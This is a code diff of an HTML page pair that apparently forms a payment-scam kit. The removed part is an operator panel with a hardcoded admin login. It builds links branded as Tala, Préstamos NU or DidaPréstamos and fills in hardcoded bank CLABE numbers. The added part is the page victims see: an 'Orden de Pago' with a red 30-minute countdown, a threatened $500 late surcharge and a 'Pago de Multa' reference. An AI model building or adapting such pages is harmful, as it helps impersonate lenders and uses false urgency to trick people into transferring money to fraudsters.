@@ -3,102 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Generador de Ligas</title>
+    <title>Orden de Pago</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-        body { font-family: 'Inter', sans-serif; background-color: #0b1120; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        #login-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: url('https://img.freepik.com/foto-gratis/fondo-luces-bokeh-dorado-abstracto_23-2148413465.jpg') no-repeat center center; background-size: cover; filter: brightness(0.5); }
-        .login-card { width: 100%; max-width: 400px; background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(15px); padding: 3rem 2.5rem; border-radius: 3rem; text-align: center; }
-        #main-app { display: none; width: 100%; max-width: 440px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
-        .monto-box { border-radius: 1.5rem; padding: 1.5rem; margin: 1rem 1.5rem; }
+        body { font-family: 'Inter', sans-serif; background-color: #0b1120; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card-detalle { width: 100%; max-width: 440px; background: white; border-radius: 2.5rem; overflow: hidden; position: relative; }
+        .timer-red { color: #ef4444; font-weight: 800; animation: pulse 1s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        #toast { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: #1e293b; color: white; padding: 10px 20px; border-radius: 12px; font-size: 11px; opacity: 0; transition: 0.3s; z-index: 100; }
     </style>
 </head>
 <body>
-    <div id="login-bg"></div>
-    <div id="login-screen" class="px-4 w-full flex justify-center">
-        <div class="login-card">
-            <h2 class="text-3xl font-bold text-slate-800 mb-8">Acceso Admin</h2>
-            <div class="space-y-5">
-                <input type="text" id="user" placeholder="Usuario" class="w-full px-6 py-4 rounded-2xl border border-slate-200 outline-none">
-                <input type="password" id="pass" placeholder="Contraseña" class="w-full px-6 py-4 rounded-2xl border border-slate-200 outline-none">
-                <button onclick="acceder()" class="w-full bg-blue-600 text-white font-bold py-5 rounded-2xl uppercase tracking-widest text-sm">Entrar</button>
-            </div>
-        </div>
-    </div>
-
-    <div id="main-app">
-        <div id="header-bg" class="bg-[#14b8a6] pt-10 pb-6">
-            <div class="w-24 h-24 bg-white rounded-3xl mx-auto mb-6 flex items-center justify-center overflow-hidden border-4 border-white/20">
-                <img id="app-logo" src="https://i.ibb.co/qF6Vvqy/tala-te-presta.png" class="w-full h-full object-cover">
-            </div>
-            <div class="px-8">
-                <select id="product-select" onchange="updateApp()" class="w-full bg-white/20 text-white border-none rounded-xl px-4 py-3 text-sm font-bold text-center outline-none mb-4">
-                    <option value="tala|#14b8a6|#0d9488">Tala Préstamos</option>
-                    <option value="nu|#820ad1|#581c87">Préstamos NU</option>
-                    <option value="dida|#2563eb|#1d4ed8">DidaPréstamos</option>
-                </select>
-            </div>
-            <div id="monto-card-bg" class="monto-box bg-[#0d9488] text-white">
-                <span class="text-[10px] font-bold opacity-80 uppercase tracking-widest">Monto de Pago</span>
-                <div class="flex items-center mt-2">
-                    <span class="text-4xl font-bold mr-2">$</span>
-                    <input type="number" id="input-monto" placeholder="0.00" class="bg-transparent border-none outline-none w-full text-4xl font-bold text-white">
-                </div>
-            </div>
+    <div class="card-detalle shadow-2xl">
+        <div id="toast">¡Link de pago copiado!</div>
+        
+        <div id="header-color" class="bg-[#14b8a6] text-white pt-10 pb-8 text-center px-6">
+            <span class="text-[10px] font-bold uppercase tracking-[0.2em] opacity-80">Orden de Pago</span>
+            <h1 id="display-producto" class="text-3xl font-black mt-2 uppercase">PRODUCTO</h1>
         </div>
 
         <div class="p-8 space-y-6">
-            <div class="flex justify-between items-center border-b border-slate-100 pb-3">
-                <span class="text-[11px] font-bold text-slate-400 uppercase">Vencimiento</span>
-                <input type="date" id="f-venc" class="text-sm font-bold text-slate-800 outline-none">
+            <div class="bg-gray-50/50 rounded-[2rem] p-8 text-center border border-gray-100">
+                <span class="text-[10px] font-bold text-gray-400 uppercase block mb-2 tracking-widest">Monto Total a Pagar</span>
+                <div class="text-4xl font-black text-[#0d9488]" id="display-monto">$0.00</div>
             </div>
 
-            <div class="bg-slate-50 rounded-[2rem] p-6 space-y-4 border border-slate-100">
-                <select id="metodo-pago" onchange="cambiarCuenta()" class="w-full bg-white border border-slate-200 rounded-2xl py-3 text-sm font-bold text-center outline-none">
-                    <option value="MERCADO PAGO W SPEI">MERCADO PAGO W SPEI</option>
-                    <option value="BBVA">BBVA</option>
-                </select>
-                <select id="clabe-pago" class="w-full bg-white border border-slate-200 rounded-2xl py-3 text-sm font-bold text-center text-blue-600 outline-none">
-                    <option value="722969010005687921">722969010005687921</option>
-                </select>
+            <div class="space-y-4">
+                <div class="flex justify-between items-center border-b border-gray-100 pb-3">
+                    <span class="text-[10px] font-bold text-gray-400 uppercase">Nombre del Cliente</span>
+                    <span id="display-nombre" class="text-sm font-bold text-gray-800">Cargando...</span>
+                </div>
+                <div class="flex justify-between items-center border-b border-gray-100 pb-3">
+                    <span class="text-[10px] font-bold text-gray-400 uppercase">Fecha de Vencimiento</span>
+                    <span id="display-fecha" class="text-sm font-bold text-gray-800">---</span>
+                </div>
+                
+                <div class="bg-red-50 rounded-2xl p-4 border border-red-100">
+                    <div class="flex justify-between items-center">
+                        <span class="text-[10px] font-bold text-red-600 uppercase">La liga expira en:</span>
+                        <span id="timer" class="timer-red text-lg">30:00</span>
+                    </div>
+                    <p class="text-[9px] text-red-500 mt-2 font-medium">
+                        * Al llegar a 0, se cobrarán <b class="font-bold">$500.00 pesos adicionales</b> por concepto de vencimiento de liga de pago.
+                    </p>
+                </div>
             </div>
 
-            <input type="text" id="cliente-nombre" placeholder="Nombre del cliente" class="w-full border-b border-slate-200 py-3 text-sm font-bold outline-none text-center">
+            <div class="bg-blue-50/50 rounded-[2rem] p-6 border border-blue-100 text-center space-y-2">
+                <span id="display-banco-label" class="text-[10px] font-bold text-blue-500 uppercase">TRANSFERENCIA SPEI (BBVA)</span>
+                <div id="display-clabe" class="text-xl font-black text-blue-700 tracking-widest">000000000000000000</div>
+                <p class="text-[10px] italic text-blue-400">Referencia: Pago de Multa</p>
+            </div>
 
-            <button onclick="confirmar()" id="btn-main" class="w-full bg-[#0d9488] text-white font-bold py-5 rounded-[1.5rem] uppercase text-xs tracking-widest shadow-lg">GENERAR LINK</button>
+            <button onclick="copiarLink()" class="w-full bg-[#1e293b] text-white font-bold py-5 rounded-[1.5rem] uppercase text-[11px] tracking-widest flex items-center justify-center gap-3">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" stroke-width="2"/></svg>
+                Copiar Link de Pago
+            </button>
         </div>
     </div>
 
     <script>
-        document.getElementById('f-venc').value = new Date().toISOString().split('T')[0];
-        function acceder() { if(document.getElementById('user').value === "admin" && document.getElementById('pass').value === "123") { document.getElementById('login-screen').style.display = 'none'; document.getElementById('main-app').style.display = 'block'; } }
-        function cambiarCuenta() {
-            const m = document.getElementById('metodo-pago').value;
-            const c = document.getElementById('clabe-pago');
-            c.innerHTML = "";
-            let num = (m === "MERCADO PAGO W SPEI") ? "722969010005687921" : "012180015094579916";
-            c.add(new Option(num, num));
+        const params = new URLSearchParams(window.location.search);
+        const startTime = parseInt(params.get('start')) || Date.now();
+        
+        document.getElementById('display-monto').innerText = "$" + parseFloat(params.get('monto') || 0).toLocaleString('en-US', {minimumFractionDigits: 2});
+        document.getElementById('display-nombre').innerText = params.get('nombre') || "Cliente";
+        document.getElementById('display-fecha').innerText = params.get('fecha') || "---";
+        document.getElementById('display-producto').innerText = params.get('prod') || "PRESTAMO";
+        document.getElementById('display-clabe').innerText = (params.get('clabe') || "").replace(/\s+/g, '');
+        
+        const banco = params.get('banco') || "";
+        document.getElementById('display-banco-label').innerText = banco.includes("MERCADO") ? "TRANSFERENCIA MERCADO PAGO (SPEI)" : "TRANSFERENCIA BBVA (SPEI)";
+
+        const duracionTotal = 30 * 60 * 1000; 
+        function actualizarTimer() {
+            const ahora = Date.now();
+            const restante = duracionTotal - (ahora - startTime);
+
+            if (restante <= 0) {
+                document.getElementById('timer').innerText = "EXPIRADO";
+                clearInterval(intervalo);
+            } else {
+                const m = Math.floor(restante / 60000);
+                const s = Math.floor((restante % 60000) / 1000);
+                document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' + s : s}`;
+            }
         }
-        function confirmar() {
-            const params = new URLSearchParams({
-                monto: document.getElementById('input-monto').value || "0.00",
-                nombre: document.getElementById('cliente-nombre').value || "Cliente",
-                fecha: document.getElementById('f-venc').value,
-                prod: document.getElementById('product-select').options[document.getElementById('product-select').selectedIndex].text,
-                clabe: document.getElementById('clabe-pago').value,
-                banco: document.getElementById('metodo-pago').value,
-                start: Date.now() // ESTO ES LO QUE ARREGLA EL CRONÓMETRO
+        const intervalo = setInterval(actualizarTimer, 1000);
+        actualizarTimer();
+
+        function copiarLink() {
+            navigator.clipboard.writeText(window.location.href).then(() => {
+                const t = document.getElementById('toast');
+                t.style.opacity = "1";
+                setTimeout(() => t.style.opacity = "0", 2000);
             });
-            window.location.href = `detalle.html?${params.toString()}`;
-        }
-        function updateApp() {
-            const logos = {'tala': 'https://i.ibb.co/qF6Vvqy/tala-te-presta.png','nu': 'https://i.ibb.co/Lzf7vYn/image-45ecfc.png','dida': 'https://i.ibb.co/BccC9Rz/image-46429b.png'};
-            const [id, c1, c2] = document.getElementById('product-select').value.split('|');
-            document.getElementById('header-bg').style.backgroundColor = c1;
-            document.getElementById('monto-card-bg').style.backgroundColor = c2;
-            document.getElementById('btn-main').style.backgroundColor = c2;
-            document.getElementById('app-logo').src = logos[id] || logos['tala'];
         }
     </script>
 </body>
